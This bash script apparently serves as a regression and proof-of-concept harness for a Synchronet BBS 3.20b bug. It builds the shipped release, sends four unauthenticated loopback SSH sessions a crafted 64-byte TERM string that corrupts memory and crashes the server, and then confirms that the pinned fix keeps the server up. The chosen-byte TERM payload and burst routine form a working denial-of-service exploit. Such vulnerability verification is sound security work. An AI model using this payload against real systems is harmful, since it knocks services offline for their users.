#!/usr/bin/env bash
# W26: measure availability impact on the earliest claimed-affected SHIPPED
# release 3.20b (db9c5d6f), not the dev parent used by W6/W16. Four concurrent
# unauthenticated loopback SSH pty-req TERMs of 64 chosen bytes set
# line_delay=0x4853494d and corrupt savedlines.first/.last. First run predicted
# W6-style node exhaustion; it failed (see evidence/FAILED-PREDICTION.md): the
# process SIGSEGVs at first teardown and the fifth client gets a refused
# connection. The pinned cb6d77dbca fixed form serves all five.
# Instrumentation-only probe lines are added after the verbatim copy statements;
# all copy logic comes from the pinned source or harness/fixed.inc. Loopback only.
set -euo pipefail
cd "$(dirname "$0")/../../.."
HERE=$PWD
TREE=$HERE/src-tree/320b
P=$HERE/provision
LANE=$HERE/release-label/term320b/availability320b
E=$LANE/evidence
PARENT=db9c5d6fd37ef74b6e6ca647308d351e656de18d
MIRROR=https://github.com/SynchronetBBS/sbbs.git
DEBS="zip libarchive-dev libnspr4-dev autoconf2.13"
pass=0
fail=0

note() { echo "AVAIL320B $*"; }
expect() {
    local what=$1 desc=$2
    if eval "$what"; then
        note "PASS $desc"
        pass=$((pass + 1))
    else
        note "FAIL $desc (test: $what)"
        fail=$((fail + 1))
    fi
}

if [ ! -e "$TREE/.git" ]; then
    note "cloning pinned shipped 3.20b parent $PARENT"
    git clone --no-checkout "$MIRROR" "$TREE"
    git -C "$TREE" checkout --detach "$PARENT"
fi
test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || {
    echo "TREE_HEAD_MISMATCH"; exit 2;
}
mkdir -p "$E" "$P/debs" "$P/local" || exit 2
for d in $DEBS; do
    (cd "$P/debs" && test -f "${d}_"*.deb || apt-get download "$d")
done
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 "$L/libacl.so"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
    sleep 1
}
cleanup_src() {
    git -C "$TREE" checkout -- src/sbbs3/answer.cpp 2>/dev/null || true
}
stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    cleanup_stale
    SPID=
}
trap 'stop_server; cleanup_src' EXIT
cleanup_src

HN=$(hostname)
INI="$TREE/ctrl/sbbs.$HN.ini"
write_ini() {
    local port=$1
    cat > "$INI" <<EOF
; W26 lab-only loopback SSH config on shipped 3.20b; all other services off.
; SSH_ANYAUTH is required for unauthenticated loopback TERM reach on this build.
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging
[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $port
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS
[Mail]
	AutoStart = false
[FTP]
	AutoStart = false
[Web]
	AutoStart = false
[Services]
	AutoStart = false
[UNIX]
	Daemonize = False
	PidFile = sbbs-w26.pid
	LogFacility = User
	LogIdent = synchronet-w26
	umask = 077
EOF
}
PORT=$((25000 + $$ % 1000))
write_ini "$PORT"

build() {
    cleanup_stale
    make -C "$TREE/3rdp/build" jslib > "$P/jslib-w26.log" 2>&1 || return 1
    make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w26.log" 2>&1 || return 1
}
port_bindable() {
    python3 - "$1" <<'PY'
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(('127.0.0.1', int(sys.argv[1])))
except OSError:
    sys.exit(1)
finally:
    s.close()
PY
}
wait_port_free() {
    for i in $(seq 1 120); do
        if ! ss -ltn 2>/dev/null | grep -q ":$PORT " && port_bindable "$PORT"; then
            return 0
        fi
        cleanup_stale
        sleep 0.5
    done
    echo PORT_BUSY; return 1
}
start_server() {
    local label=$1 log="$E/$2"
    wait_port_free || return 1
    (cd "$TREE" && exec env SBBSCTRL="$TREE/ctrl" \
        ./src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 120); do
        if grep -q '!ERROR 98 binding SSH Server socket' "$log"; then
            echo PORT_BIND_ERROR; return 1
        fi
        grep -q 'Terminal Server thread started for nodes 1 through 4' "$log" && return 0
        sleep 0.5
    done
    echo SERVER_START_TIMEOUT; return 1
}
run_case() {
    local term=$1 out=$2 i
    (for i in $(seq 1 3); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout 10 ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}

CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"
CONTROL="$(printf 'A%.0s' $(seq 1 40))"
test "${#CHOSEN}" -eq 64 || { echo BAD_TERM_LENGTH; exit 5; }
VULN_PROBE='REAL_320B_PROBE sizeof=41 l=64 off41=42 cv=4853494d first=0x465541544f4f2d45 last=0x5a5a5a5a46554154'
FIXED_PROBE='FIXED_320B_PROBE sizeof=41 wire=64 len=40 off41=00 cv=00000000 first=(nil) last=(nil)'
CONTROL_PROBE='FIXED_320B_PROBE sizeof=41 wire=40 len=40 off41=00 cv=00000000 first=(nil) last=(nil)'

burst() {
    local label=$1 term=$2 probe=$3 i c pids=()
    for i in 1 2 3 4; do
        run_case "$term" "$E/${label}-client-$i.log" &
        pids+=($!)
        sleep 0.4
    done
    c=0
    for i in $(seq 1 60); do
        c=$(grep -cF "$probe" "$E/${label}-server.log" 2>/dev/null || true)
        [ "$c" -ge 4 ] && break
        sleep 0.25
    done
    note "$label probes seen: $c"
    for p in "${pids[@]}"; do wait "$p" || true; done
    sleep 2
    # Yama ptrace_scope forbids gdb -p here; read thread wchan/syscall directly.
    # Record process state before the fifth client so a teardown crash is
    # distinguished from four legitimately busy node threads.
    { printf 'PID=%s ' "$SPID"; if [ -r "/proc/$SPID/stat" ]; then
        awk '{print "STATE=" $3}' "/proc/$SPID/stat"; else echo "STATE=gone"; fi
    } > "$E/${label}-alive.txt"
    for t in /proc/$SPID/task/*; do
        printf '%s ' "$(basename "$t")"
        (cat "$t/comm" "$t/wchan" "$t/syscall" 2>/dev/null || true) | tr '\n' ' '
        echo
    done > "$E/${label}-threads.txt"
    run_case "$CONTROL" "$E/${label}-client-5th.log"
}

# Phase 1: unmodified shipped 3.20b copy plus instrumentation-only probe.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/release-label/term320b/real320b/probe-320b.patch") || exit 6
build || { echo BUILD_FAILED_VULN; exit 7; }
start_server vuln vuln-server.log || exit 8
burst vuln "$CHOSEN" "$VULN_PROBE"
stop_server

# Phase 2: byte-exact pinned fixed hunk via the W22 patcher, fresh port.
PORT=$((PORT + 1))
write_ini "$PORT"
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
python3 "$LANE/../fixed320b/patch-fixed.py" > "$E/pinned-hunk.log" 2>&1 || {
    cat "$E/pinned-hunk.log"; exit 9;
}
build || { echo BUILD_FAILED_FIXED; exit 10; }
start_server fixed fixed-server.log || exit 11
burst fixed "$CHOSEN" "$FIXED_PROBE"
stop_server

expect "test \$(grep -cF '$VULN_PROBE' '$E/vuln-server.log') -ge 4" \
    'vulnerable: four chosen 64-byte line_delay + pointer probes'
expect "grep -q 'Node 1 destructor begin' '$E/vuln-server.log'" \
    'vulnerable: a session reached the chosen-pointer teardown'
expect "! grep -q 'destructor end' '$E/vuln-server.log'" \
    'vulnerable: no teardown completed (process SIGSEGV)'
expect "grep -qE 'STATE=(gone|Z)' '$E/vuln-alive.txt'" \
    'vulnerable: sbbs process was dead at the fifth connection'
expect "grep -q 'Connection refused' '$E/vuln-client-5th.log'" \
    'vulnerable: fifth client refused because the listener was gone'
expect "! grep -q '!No nodes available for login.' '$E/vuln-server.log'" \
    'vulnerable: W6/W16 node-exhaustion mechanism did NOT fire on 3.20b'
expect "grep -qF 'FIXED_HUNK_PINNED_OK' '$E/pinned-hunk.log'" \
    'fixed: copy statements are the byte-exact pinned cb6d77dbca hunk'
expect "test \$(grep -cF '$FIXED_PROBE' '$E/fixed-server.log') -ge 4" \
    'fixed: four bounded 40-byte copies from the same 64-byte wire TERM'
expect "test \$(grep -cF '$CONTROL_PROBE' '$E/fixed-server.log') -eq 1" \
    'fixed: fifth 40-byte wire control also bounded'
expect "! grep -q 'Connection refused' '$E/fixed-client-5th.log'" \
    'fixed: fifth client connected'
expect "test \$(grep -c 'Attaching to Node' '$E/fixed-server.log') -ge 5" \
    'fixed: five sessions each attached to a node'
expect "test \$(grep -c 'destructor end' '$E/fixed-server.log') -ge 4" \
    'fixed: teardown completed'
expect "! grep -qE 'STATE=(gone|Z)' '$E/fixed-alive.txt'" \
    'fixed: sbbs process alive at the fifth connection'

echo "RESULT: PASS=$pass FAIL=$fail"
note "EVIDENCE_DIR=$E"
test "$fail" -eq 0
